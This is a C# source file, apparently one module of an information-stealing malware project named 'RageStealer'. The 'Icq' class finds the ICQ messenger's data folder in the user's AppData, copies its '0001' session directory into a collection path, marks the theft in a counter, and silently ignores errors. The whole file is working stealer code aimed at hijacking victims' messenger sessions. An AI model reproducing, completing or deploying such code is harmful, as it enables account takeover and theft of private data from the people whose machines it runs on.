using System.IO;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Messengers;

internal sealed class Icq
{
	private static readonly string ICQPath = Path.Combine(Paths.Appdata, "ICQ");

	public static void GetSession(string sSavePath)
	{
		if (!Directory.Exists(ICQPath))
		{
			return;
		}
		string text = Path.Combine(ICQPath, "0001");
		if (!Directory.Exists(text))
		{
			return;
		}
		try
		{
			Filemanager.CopyDirectory(text, sSavePath + "\\0001");
			Counter.Icq = true;
		}
		catch
		{
		}
	}
}
